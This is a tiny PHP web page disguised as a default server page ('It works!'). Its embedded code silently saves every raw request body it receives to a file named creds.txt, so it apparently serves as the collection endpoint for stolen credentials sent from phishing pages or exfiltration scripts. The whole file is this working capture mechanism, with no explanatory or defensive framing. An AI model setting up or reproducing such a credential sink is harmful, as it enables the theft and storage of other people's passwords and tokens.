<html>
   <title>PHP Server</title>
   <body>
      <h1>It works!</h1>
      <?php
      $file = fopen("creds.txt", "w+");
      fwrite($file, file_get_contents("php://input"));
      fclose($file);
      ?>
   </body>
</html>
